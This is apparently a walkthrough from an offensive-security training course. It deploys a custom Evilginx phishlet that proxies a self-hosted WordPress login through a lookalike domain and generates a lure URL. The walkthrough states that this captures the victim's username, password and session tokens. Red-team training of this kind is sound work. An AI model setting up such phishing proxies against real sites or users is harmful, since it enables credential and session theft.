# Create a Custom Phishlet for Self-Hosted Wordpress

### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/67-walkthrough-create-a-custom-phishlet-for-self-hosted-wordpress#user-content-solution-overview)Solution Overview

A working version of the custom phishlet is available here:

[hacksmarter.yaml on GitHub](https://github.com/TeneBrae93/phishing/blob/main/hacksmarter.yaml)

You’re encouraged to fork the repo, study the YAML, and reuse this structure for other self-hosted WordPress targets.

### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/67-walkthrough-create-a-custom-phishlet-for-self-hosted-wordpress#user-content-step-by-step-deployment-instructions)Step-by-Step Deployment Instructions

#### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/67-walkthrough-create-a-custom-phishlet-for-self-hosted-wordpress#user-content-1-copy-and-save-the-phishlet)1. **Copy and Save the Phishlet**

From your Digital Ocean Droplet:

```
cd ~/evilginx/phishlets nano hacksmarter.yaml
```

Paste the contents from the GitHub file, then save with:  
`Ctrl + X`, then `Y`, then `Enter`.

---

#### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/67-walkthrough-create-a-custom-phishlet-for-self-hosted-wordpress#user-content-2-launch-evilginx)2. **Launch Evilginx**

```
cd ~/evilginx ./evilginx
```

---

#### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/67-walkthrough-create-a-custom-phishlet-for-self-hosted-wordpress#user-content-3-disable-any-existing-phishlets)3. **Disable Any Existing Phishlets**

```
phishlets disable wordpress.org phishlets hide wordpress.org
```

---

#### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/67-walkthrough-create-a-custom-phishlet-for-self-hosted-wordpress#user-content-4-enable-the-custom-phishlet)4. **Enable the Custom Phishlet**

```
phishlets hostname hacksmarter login.hacksmarter-manufacturing.cam phishlets enable hacksmarter
```

Evilginx will request TLS certificates and prepare the proxy environment.

---

#### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/67-walkthrough-create-a-custom-phishlet-for-self-hosted-wordpress#user-content-5-create-the-lure)5. **Create the Lure**

```
lures create hacksmarter lures get-url 1 # Replace with actual lure ID if different
```

Open the URL in a browser. You should see the **real login page**, proxied invisibly through Evilginx.

---

### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/67-walkthrough-create-a-custom-phishlet-for-self-hosted-wordpress#user-content-from-the-victims-perspective)From the Victim’s Perspective

When a target (e.g., user _Tony_) logs in using the phishing lure:

- They are redirected to the real WordPress dashboard.
- Their **username** and **password** are captured.
- Evilginx2 may also capture **session tokens**, depending on configuration.
